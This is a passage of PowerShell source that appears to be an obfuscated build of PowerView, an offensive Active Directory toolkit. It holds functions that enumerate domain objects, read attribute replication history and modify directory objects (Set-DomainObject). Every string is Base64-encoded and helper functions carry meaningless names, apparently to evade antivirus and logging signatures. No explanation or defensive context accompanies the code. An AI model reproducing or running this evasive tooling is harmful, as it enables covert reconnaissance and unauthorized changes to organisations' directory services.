        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${456} = f74 @48
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            f115 -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${456}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAyADUAMgB9ACkA')))
                }
                elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0A')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAMgA1ADQAfQAnACAAZgByAG8AbQAgACcAJAB7ADIANQAyAH0AJwA=')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${456} = f74 @48
                        if (-not ${456}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAyADUANAB9ACcA')))
                        }
                    }
                }
                elseif (${252} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${253} = (([Guid]${252}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                }
                elseif (${252}.Contains('\')) {
                    ${401} = ${252}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | f111 -f40 Canonical
                    if (${401}) {
                        ${459} = ${401}.SubString(0, ${401}.IndexOf('/'))
                        ${460} = ${252}.Split('\')[1]
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsANAA2ADAAfQApAA==')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${459}
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsANAA1ADkAfQAnACAAZgByAG8AbQAgACcAJAB7ADIANQAyAH0AJwA=')))
                        ${456} = f74 @48
                    }
                }
                elseif (${252}.Contains('.')) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADIANQAyAH0AKQAoAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApACgAZABuAHMAaABvAHMAdABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQApAA==')))
                }
                else {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADIANQAyAH0AKQAoAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApACgAZABpAHMAcABsAGEAeQBuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQApAA==')))
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${458} = $_.Substring(4)
                    ${457} = [Int](${23}::${458})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsANAA1ADcAfQApACkA')))
                }
                else {
                    ${457} = [Int](${23}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewA0ADUANwB9ACkA')))
                }
            }
            if ($Filter -and $Filter -ne '') {
                ${456}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $(${456}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${456}.FindOne() }
            else { ${72} = ${456}.FindAll() }
            ${72} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQALgBSAGEAdwA='))))
                }
                else {
                    $Object = f104 -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQA'))))
                }
                $Object
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${456}.dispose()
        }
    }
}
function Get-DomainObjectAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))] = $FindOne }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${455} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${455} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        f98 @48 | % {
            ${258} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${385} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA==')))]) {
                ${384} = [xml]${385} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAEEAVABUAFIAXwBNAEUAVABBAF8ARABBAFQAQQA='))) -ErrorAction SilentlyContinue
                if (${384}) {
                    if (${384}.pszAttributeName -Match ${455}) {
                        ${134} = New-Object PSObject
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${258}
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${384}.pszAttributeName
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${384}.ftimeLastOriginatingChange
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${384}.dwVersion
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${384}.pszLastOriginatingDsaDN
                        ${134}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${134}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAGEAdAB0AHIAaQBiAHUAdABlAG0AZQB0AGEAZABhAHQAYQAnACAAZgBvAHIAIAAnACQAewAyADUAOAB9ACcA')))
                }
            }
        }
    }
}
function Get-DomainObjectLinkedAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${455} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${455} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        f98 @48 | % {
            ${258} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${385} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${384} = [xml]${385} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${384}) {
                    if (${384}.pszAttributeName -Match ${455}) {
                        ${134} = New-Object PSObject
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${258}
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${384}.pszAttributeName
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAVgBhAGwAdQBlAA=='))) ${384}.pszObjectDn
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBDAHIAZQBhAHQAZQBkAA=='))) ${384}.ftimeCreated
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${384}.ftimeDeleted
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${384}.ftimeLastOriginatingChange
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${384}.dwVersion
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${384}.pszLastOriginatingDsaDN
                        ${134}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQATABpAG4AawBlAGQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${134}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEwAaQBuAGsAZQBkAEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAHYAYQBsAHUAZQBtAGUAdABhAGQAYQB0AGEAJwAgAGYAbwByACAAJwAkAHsAMgA1ADgAfQAnAA==')))
                }
            }
        }
    }
}
function Set-DomainObject {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{'Raw' = $True}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
